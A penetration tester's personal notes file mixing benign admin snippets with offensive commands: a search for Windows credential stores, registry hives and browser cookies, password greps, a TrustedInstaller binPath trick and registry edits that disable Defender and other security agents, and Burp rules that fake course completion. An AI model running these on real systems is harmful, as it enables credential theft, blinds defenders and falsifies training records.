# Pentest Notes 
Moving all new pentest notes here 
old arcive is at :
https://github.com/freeload101/SCRIPTS/blob/master/fu.txt
more stuff here 
https://rmccurdy.com/.scripts

# Contact
https://calendly.com/rmccurdy1
MBTI Myers-Brigg personality ENFJ and  tritype Enneagram 729

# AI Notes
My AI Notes ( Please contribute ! ) 
https://docs.google.com/document/d/17z3i5VlRzEn2tYPfb-Cx0LYpdKkbL-6svIzp7ZQOvX8/edit?tab=t.0#heading=h.q61oszw9zg0f

# Rmccurdy Stuff
https://RmcCurdy.com
https://heartbeatz.rmccurdy.com/
https://linkedin.com/in/rmccurdy1/detail/recent-activity/posts/
https://youtube.com/@freeload101
https://infosec.exchange/@operat0r
https://techhub.social/@operat0r
https://bsky.app/profile/rmccurdydotcom.bsky.social

## Hacker Public Radio ! 
( IF YOU ARE LOOKING AT THIS I NEED TO INTERVIEW YOU FOR HPR ! WE NEED SHOWS ! 
https://hackerpublicradio.org/correspondents/0036.html
Example Questions:
https://docs.google.com/document/d/1gTAif_4m16Li-9zpH2BNeBjyR7qNRop8KMXSb9wmoMw/edit?usp=drive_link


## Moved MINDcraft to it's repo.   
https://github.com/freeload101/MSC_MINDcraft_Single_Click

## Phishing  senior citizens
https://www.iamcybersafe.org/s/cyber-safety-tips

## Hardware Specs
GPU: 3090 24 NVRAM 
RAM 64.0 GB G.SKILL Ripjaws S5 Series 32GB (2 x 16GB) 288-Pin PC RAM DDR5 5200 (PC5 41600) Desktop Memory Model F5-5200J3636C16GX2-RS5K
Processor:13th Gen Intel(R) Core(TM) i5-13600K (20 CPUs), ~3.5GHz

SAMSUNG 980 PRO SSD 2TB PCIe NVMe Gen 4


## Nessus 
https://rmccurdy.com/.scripts/NessusParser-Excel 

## JAMBOREE 
Java Android Magisk Burp Objection Root Emulator Easy
https://jamboree.rmccurdy.com/

## Open WebUI
http://gpt.rmccurdy.com

## iKAT Console Citrix Kiosk Hacking
https://console.rmccurdy.com/



## My github stuff:
https://github.com/freeload101
* https://github.com/freeload101/SCRIPTS # random stuff gets dumped here  stuff

## InfoSec Skills 
https://rmccurdy.com/.scripts/downloaded/knowmore.cybersn.com_20220811.txt
 
# AD 

https://raw.githubusercontent.com/freeload101/SCRIPTS/080c5c26b535a81493a5df8b2a50947dc1731d91/MISC/Pentest%20Notes/mindmap_ad_dark_classic_2025.03.excalidraw.svg


# EDR
https://rmccurdy.com/.scripts/.BYPASS_TOOLS/

## CrowdStrike
https://github.com/freeload101/CrowdStrike_RTR_Powershell_Scripts
https://github.com/freeload101/SCRIPTS/tree/master/CrowdStrike%20Threat%20Hunting

# Splunk
https://github.com/freeload101/SCRIPTS/tree/master/CrowdStrike%20Threat%20Hunting ( more like  CS / splunk )

# Post Exploit
## VNC as root like a BOSS!
	# root vnc vncserver 
	apt-get update && apt-get install -y tightvncserver
	vncpasswd
	vncserver :1 -geometry 1920x1080 -depth 24 
	
	vi /root/.vnc/xstartup
	
	
	#!/bin/bash
	xrdb $HOME/.Xresources
	startxfce4 &
	
	chmod +x /root/.vnc/xstartup
	
	vncserver -kill :1
	vncserver :1 -geometry 1920x1080 -depth 24

# Looting
## Veeam
https://repository.veeam.com/backup/linux/agent/dpkg/debian/public/pool/veeam/v/veeam-release-deb/

Extract tool debian
https://rmccurdy.com/.scripts/downloaded/VeeamExtract_12.3.2.3617_EXTRACT_BINARY

Install deb
https://repository.veeam.com/backup/linux/agent/dpkg/debian/public/pool/veeam/v/veeam-release-deb/
https://rmccurdy.com/.scripts/downloaded/Veeam-release-deb_1.0.9_amd64.deb

## Powershell looting

	find . -type f \( \
	  -ipath "*/Users/*/AppData/Roaming/Microsoft/Credentials/*" -o \
	  -ipath "*/Users/*/AppData/Local/Microsoft/Credentials/*" -o \
	  -ipath "*/Users/*/AppData/Roaming/Microsoft/Protect/*" -o \
	  -ipath "*/Users/*/AppData/Local/Microsoft/Vault/*" -o \
	  -ipath "*/Users/*/AppData/Local/Microsoft/Windows/Vault/*" -o \
	  -ipath "*/Users/*/AppData/Roaming/Microsoft/SystemCertificates/My/*" -o \
	  -ipath "*/Users/*/AppData/Roaming/Microsoft/Windows/Recent/*" -o \
	  -ipath "*/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt" -o \
	  -ipath "*/ProgramData/Microsoft/Vault/*" -o \
	  -ipath "*/Windows/System32/config/SAM" -o \
	  -ipath "*/Windows/System32/config/SECURITY" -o \
	  -ipath "*/Windows/System32/config/SYSTEM" -o \
	  -ipath "*/Windows/System32/config/SOFTWARE" -o \
	  -ipath "*/Windows/System32/config/RegBack/*" -o \
	  -ipath "*/Users/*/AppData/Local/Google/Chrome/User Data/*/Login Data" -o \
	  -ipath "*/Users/*/AppData/Local/Google/Chrome/User Data/*/Cookies" -o \
	  -ipath "*/Users/*/AppData/Roaming/Mozilla/Firefox/Profiles/*/cookies.txt" -o \
	  -ipath "*/Users/*/ntuser.dat" -o \
	  -ipath "*/Users/*/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/*" -o \
	  -ipath "*/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/*" -o \
	  -ipath "*/Users/*/Desktop/*.rdp" -o \
	  -ipath "*/Users/*/Documents/*.rdp" -o \
	  -ipath "*/Users/*/AppData/Local/Microsoft/Terminal Server Client/Cache/*" \
	\) -ls 2>/dev/null
 
# Logging Console Hacks  IDK

## pretty print JSON brah ... gezz .. 
	python -m json.tool out.json


## Rip Grep RipGrep -uuu to include hidden and bins etc 
	rg  -uuu -C 3 -H   --max-columns=1000 -ia '(\bpass|key\b|\bs3\b|\bhttp)' ./*  |tee ~/RIP_GREP.txt

## Disk usage
	du -h --max-depth=4 | sort -rh | grep G


## TTY Recording
	
	* make bash defualt shell for root
	sed -i -re 's/(^root.*).*zsh/\1bash/g'  /etc/passwd
	
	* add to both /root/.bashrc and ~/.bashrc 
	 
	* DUMB PS1 add timestamp to your shell
	PS1='\n$(date "+%Y-%m-%d %I:%M:%S %p"):[\w]\n\u: '
	
	* log input and output per ENV
	if [[ -t 0 ]] && [[ -z "$IN_TTYREC" ]]; then
	  mkdir -p ~/ttylogs
	  export IN_TTYREC=1
	  TIMESTAMP=$(date +%Y%m%d-%H%M%S)
	  LOGFILE=~/ttylogs/$TIMESTAMP.tty
	  # exec replaces the shell with ttyrec running your shell
	  script -q $LOGFILE
	fi

## SCREEN MOUSE WHEEL MOUSEWHEEL 
	sudo echo "mousetrack on" >> /etc/screenrc
	sudo echo "defscrollback 1000000" >> /etc/screenrc 
	echo "mousetrack on" >> ~/.screenrc
	echo "defscrollback 1000000" >> ~/.screenrc


# ToDo: 
 
* ccahshe 
* mitm6

* user as pass ''
* common endpoint 
* burp suite API labs
* Rsccm lab
* Rgoad
* LSA why no LSA in Winpmem dump ?

# Unsorted
* https://viperone.gitbook.io/pentest-everything



## Postgres Rabbit hole
	docker run --rm -it \
	  -v /[REDACTED]/[REDACTED]_VCSA_bkup/S_8.0.2.00000_20231011-035907_/storage/db/vpostgres:/var/lib/postgresql/data  \
	  -v /[REDACTED]/[REDACTED]_VCSA_bkup/S_8.0.2.00000_20231011-035907_/storage/seat:/seat   \
	  -v /tmp:/tmp:rw \
	  -e POSTGRES_HOST_AUTH_METHOD=trust \
	  postgres:14 \
	bash





	cat > /var/lib/postgresql/data/postgresql.conf <<EOF
	shared_preload_libraries = ''
	ssl = off
	logging_collector = off
	EOF

	apt update;apt install -y psmisc vim
	 
	mkdir -p /storage/seat/vpostgres
	for tblsp in alarmtblsp eventtblsp hs1tblsp hs2tblsp hs3tblsp hs4tblsp tasktblsp; do
	ln -s /seat/vpostgres/$tblsp /storage/seat/vpostgres/$tblsp
	done
	 
	 
	 AS POSTEERESLR SUSER 

	gosu postgres bash

	find / -iname postmaster.pid -exec rm '{}' \; 2> /dev/null

	pg_resetwal -f /var/lib/postgresql/data
		
	cat > /var/lib/postgresql/data/pg_hba.conf <<EOF
	local   all   all                trust
	host    all   all  127.0.0.1/32  trust
	host    all   all  ::1/128       trust
	EOF

	for ts in /seat/vpostgres/*tblsp; do
	[ -d "$ts" ] || continue
	cp -a "$ts"/* /var/lib/postgresql/data/base/
	done
				
	pg_ctl -D /var/lib/postgresql/data   start
	 
	pg_dumpall -U postgres -f /tmp/vcsa_dump.sql

	 IN ANOHTER INSTANCE DO NOT EXIT THE DOCKER !!!

	docker cp `docker ps | awk '{print $1}' | grep -v CON`:/tmp/vcsa_dump.sql /tmp/vcsa_dump.sql
	Successfully copied 762MB to /tmp/vcsa_dump.sql


* zip up with PW
	7z a -tzip -p'AAAAAAAAAAAAAAAAAAAAA' -mx=1 -mmt=on -mm=Deflate -mfb=8  /home/bob/backup1.7z /mnt/backup
----------------------------------------------------------------------------------------------------------------------






	Get CPU usage for top 5 process
	Get-Process | Sort CPU -descending | Select -first 5 -Property ID, ProcessName, Description, CPU 


	yt-dlp --external-downloader aria2c --external-downloader-args " -x 16 -s 16 -k 1M"    "https://www.youtube.com/c/kidzbop/playlists"  -o "%(channel_id)s/%(playlist_id)s/%(title)s %(id)s.%(ext)s"  -f 'ba' -x --audio-format mp3

	with title 
	yt-dlp  -o "%(upload_date>%Y-%m-%d)s_%(title)s.%(ext)s" -a LIST.txt

	without title...
	FOR /F "tokens=* delims=" %%a in ('type LIST.txt') do (
	call :GetTimestamp
	echo Timestamp in loop: %timestamp%
	echo Url is:  "%%a"
	yt-dlp.exe   -o ".\%timestamp%.mp4" "%%a"
	timeout /t 1 >nul
	)
	goto :eof

	:GetTimestamp
	for /f "tokens=2 delims==" %%a in ('wmic OS Get localdatetime /value') do set "dt=%%a"
	set "YY=%dt:~2,2%" & set "MM=%dt:~4,2%" & set "DD=%dt:~6,2%"
	set "HH=%dt:~8,2%" & set "Min=%dt:~10,2%" & set "Sec=%dt:~12,2%"
	set "timestamp=%YY%%MM%%DD%-%HH%%Min%%Sec%"
	goto :eof





	This is a difficult problem that took me forever to figure out but once I show you the trick, you are going to kick yourself. You cannot stop map from doing this, but you can work around it; you need to use both a subsearch and a map like this:

	| makeresults
	| eval test = "sourcetype,host"
	| map search="| tstats latest(_time) AS lastTime WHERE index=_internal by [|makeresults | eval test=$test$ | return $test]"


	Shhhh I can't IR ... Defender, ForcePoint, SMS Agent Host ...I just can't anymore ...
	sc config TrustedInstaller binPath= "Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense" /v Start /t reg_dword /d 4 /f"  
	sc start "TrustedInstaller" 
	sc config TrustedInstaller binPath= "Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Fppsvc" /v Start /t reg_dword /d 4 /f"  
	sc start "TrustedInstaller" 
	sc config TrustedInstaller binPath= "Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CcmExec" /v Start /t reg_dword /d 4 /f"  
	sc start "TrustedInstaller" 
	sc config TrustedInstaller binPath= "Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t reg_dword /d 4 /f"  
	sc config TrustedInstaller binPath= "C:\Windows\servicing\TrustedInstaller.exe"

	in safe mode ... 
	Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense" /v Start /t reg_dword /d 4 /f
	Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv" /v Start /t reg_dword /d 4 /f
	Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v Start /t reg_dword /d 4 /f
	Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot" /v Start /t reg_dword /d 4 /f
	Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t reg_dword /d 4 /f
	Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter" /v Start /t reg_dword /d 4 /f


	! 2022-09-07 https://bandcamp.com block bandcamp ads bandcamp feed albums only show
	bandcamp.com* * li.fp.story > .track_play_hilite.collection-item-container.story-innards
	bandcamp.com* * li.df.story > .track_play_hilite.collection-item-container.story-innards
	bandcamp.com* * li.np.story > .story-innards > .story-body
	bandcamp.com* * li.np.story > .story-innards

	! How to banish that stupid "Sign in with Google" pop up!
	||accounts.google.com/gsi/*$xhr,script,3p

	! Block Facebook Ads and Follows .... 
	facebook.com* * [data-pagelet^="FeedUnit"]:has-text(/Suggested for you|Follow/)
	facebook.com* * [role="article"]:has-text(/Suggested for you|Follow/)
	! Hide the entire “Suggested for you / Follow” stories on m.facebook.com
	m.facebook.com* * div[data-ft*='"ei":']  /* generic story container */
	m.facebook.com* * div[data-ft*='"ei":'] div:has-text(/Suggested for you|Follow|Because you follow/)
	m.facebook.com* * div[data-ft*='"ei":'] div:has-text(/You may know|People you may know/)

	* setup find/Replace in burp for request  body
	LESSON_STATUS%3Dincomplete
	LESSON_STATUS%3Dpassed

	* request body
	completionStatus%3Eincomplete
	completionStatus%3Ecompleted


	* request body
	Status%3Eunknown
	Status%3Ecompleted

	* request body ( now with more 2010 era XML !...)
	successStatus%3Eunknown
	successStatus%3Ecompleted

	Only show Albums on feed!!!! (ublock ad blocker)
	Bandcamp
	There's no easy way to just show new albums in your feed. Use this uBlock filter to only show new albums!



	* windows 11 vbox virtualbox
	When the Registry Editor opens, navigate to "HKEY_LOCAL_MACHINE\SYSTEM\Setup", right-click on the "Setup" key and select "New => Key".

	When prompted to name the key, enter "LabConfig" and press enter.

	Now right-click on the "LabConfig" key and select "New => DWORD  (32-bit)" value and create a value named "BypassTPMCheck", and set its data to "1". With the same steps create the "BypassRAMCheck" and "BypassSecureBootCheck" values and set also their data to "1", so it looks like the following image.

	Click the Skip button if you do not need to configure a second layout.

	On the “Oops, you’ve lost internet connection” or “Let’s connect you to a network” page, use the Shift + F10 keyboard shortcut.

	In Command Prompt, type the OOBE\BYPASSNRO command to bypass network requirements on Windows 11 and press Enter.

	use normal Is HWID   HWIDGEN  


	plex email grep magic grep -o 

	sed:
	curl -k --silent "https://plex.tv/api/users/?X-Plex-Token=_YOURTOKEN_HERE_"| sed -rn 's/.*username=\"(.*)" email=\"(.*)" recommend.*/\1,\2/p'

	grep :
	curl -k --silent "https://plex.tv/api/users/?X-Plex-Token=_YOURTOKEN_HERE_"| grep -iPo '(?<=username=")\w+(?=")|(?<=email=")[[:alnum:]].*(?=" recommendation)'

	powershell:
	(Invoke-RestMethod -Uri 'https://plex.tv/api/users/?X-Plex-Token=_YOURTOKEN_HERE_').MediaContainer.User|select Username, Email |ConvertTo-Csv -NoTypeInformation 


	How do I do a ls and then sort the results by date created?
	https://askubuntu.com/questions/404567/how-to-organize-sort-images-by-exif-image-data
	https://stackoverflow.com/questions/43711535/linux-batch-filename-change-adding-creation-date

	ls -l --time=birth or --time=creation

	disable snap notifications 
	snap set core experimental.refresh-app-awareness=false


	Windows Performance Analyzer High CPU
	wpr.exe -start cpu.verbose && timeout 30 && wpr.exe -stop C:\CPUUsage.etl  


	block pintrest in Chrome
	Settings>Manage Search Engines
	{google:baseURL}search?q=+-site:pinterest.*+%s&{google:RLZ}{google:originalQueryForSuggestion}{google:assistedQueryStats}{google:searchFieldtrialParameter}{google:iOSSearchLanguage}{google:searchClient}{google:sourceId}{google:contextualSearchVersion}ie={inputEncoding}

	What Happened To Google Search?
	https://www.youtube.com/watch?v=48AOOynnmqU

	this broken because "security" (Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Secure Preferences") -replace 'search\?q=', 'search\?q=qqq123' |   Out-File "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Secure Preferences"



	uninstall app by DisplayName "SupportAssist" in add/remove programs via the MSI /qn method 
	Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall| Get-ItemProperty | Where-Object {$_.DisplayName -like "*SupportAssist*" } | Select-Object -ExpandProperty UninstallString| foreach {
	$arguments = $_.substring(12) + " /qn "
	echo "Running: " $_
	(Start-Process "msiexec.exe" -ArgumentList $arguments -NoNewWindow -Wait -PassThru).ExitCode
	}


	streams iptv 
	https://github.com/iptv-org/iptv/tree/master* Grouped%20by%20category

	replace whatever keywords you want in the grep ... https://rmccurdy.com/.scripts/github.com-iptv-org-RMcCurdyDOTcom.m3u

	echo 'EXTM3U' > github.com-iptv-org-RMcCurdyDOTcom.m3u & curl  'https://iptv-org.github.io/iptv/index.nsfw.m3u' | grep -Eia  --no-group-separator   "(\bswim|atlanta)"  -A 1 >> github.com-iptv-org-RMcCurdyDOTcom.m3u



	parse JSON in bash with grep ? IDK.. breaks on , { and } 
	| grep -o '[^(,|{|})]*'  | grep -oP '(?<=precipRate":)\d+\.\d+'



	poor mans logwatch tails all files that are open that have the word log in the path
	while true ;do lsof | grep 'log' |awk '{print $9}' | egrep -i "(warn|err|fail|unabl|can|not)"|awk '!x[$0]++' | xargs tail  | awk '!x[$0]++';sleep 5 ;done



	tshark (tcpdump) connectivity 
	Analyze the captured data with Wireshark, focusing on signs of retransmissions, high latency, and window size issues.
	Apply filters and use the analysis tools within Wireshark to pinpoint the root cause of the network delays


	prompt: show me 25 tshark commands to show connectitivity issues

	tshark -i any -Y "(tcp.flags.syn==1 and tcp.flags.ack==0) or tcp.analysis.retransmission or tcp.analysis.fast_retransmission or tcp.analysis.out_of_order or tcp.analysis.zero_window or tcp.analysis.lost_segment or tcp.analysis.duplicate_ack or tcp.flags.reset==1 "






		wget https://wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt
		pipx install git+https://github.com/RevoltSecurities/Dnsbruter.git
		pipx ensurepath
		# log out
		 
		echo rmccurdy.com  >> In_DomainList.txt
		 
		dnsbruter  -dL In_DomainList.txt -w best-dns-wordlist.txt  -o In_DomainList.out
 



## USAGE

cat /bin/PS

		while :; do
		  printf "\033[H\033[J"   # clear screen
		  echo "=== $(date '+%H:%M:%S') Packet Loss / Process Info ==="
		
		  # 1) interface counters
		  awk '
		  NR==FNR{for(i=3;i<=NF;i++)b[NR,i]=$i;next}
		  {iface=$1; $1="";
		   for(i=3;i<=NF;i++){d=$i-b[NR,i]; if(d)printf "%-7s col%-2d %+d\n",iface,i,d}
		  }' /proc/net/dev <(cat /proc/net/dev) |
		  grep -E 'errs|drop' | sort -k1,2
		
		  # 2) softnet drops
		  awk '
		  NR==FNR{for(i=1;i<=NF;i++)b[NR,i]=$i;next}
		  {cpu=NR-1; for(i=1;i<=NF;i++){d=$i-b[NR,i]; if(d)printf "CPU%-2d col%-2d %+d\n",cpu,i,d}}
		  ' /proc/net/softnet_stat <(cat /proc/net/softnet_stat) |
		  grep -E 'col3|col13' | head -10
		
		  # 3) conntrack table usage
		  [[ -e /proc/sys/net/netfilter/nf_conntrack_count ]] &&
		  printf "conntrack %d / %d (%d%%)\n" \
		         $(cat /proc/sys/net/netfilter/nf_conntrack_count) \
		         $(cat /proc/sys/net/netfilter/nf_conntrack_max) \
		         $(awk '{printf "%.0f",100*$1/$2}' \
		               /proc/sys/net/netfilter/nf_conntrack_{count,max})
		
		# user,mem,cpu,cmd info
		ps -eo etime,pid,user,%mem,%cpu,cmd --sort -%mem | head -n 30
		
		sleep 30
		done


# Loot


## Grep office and zip files for loot

```
      find . \( -iname "*.???x" -o -iname "*.zip" \) -type f \
           -exec unzip -p '{}' '*' \; \
      | rg -uuu -C 3 -H --max-columns=1000 '(\bpass|key\b|\bs3\b|\bhttp)'
```

